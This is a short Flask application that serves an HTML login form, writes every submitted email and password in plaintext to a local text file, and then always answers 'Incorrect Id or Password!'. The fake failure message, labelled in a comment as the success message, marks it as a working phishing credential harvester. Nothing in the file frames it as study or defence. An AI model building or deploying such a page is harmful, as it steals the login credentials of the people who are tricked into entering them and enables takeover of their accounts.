from flask import Flask, render_template, request

app = Flask(__name__)

# Route to display the form
@app.route('/')
def form():
    return render_template('index.html')  # Renders the styled HTML form

# Route to handle form submissions
@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']  # Get the email from the form
    password = request.form['password']  # Get the password from the form

    # Save the submitted details to a text file
    with open('submitted_details.txt', 'a') as f:  # Open in append mode
        f.write(f'Email: {email}, Password: {password}\n')  # Store the submitted data

    return 'Incorrect Id or Password!'  # Success message after form submission


if __name__ == '__main__':
    app.run(debug=True)  # Run the Flask server in debug mode
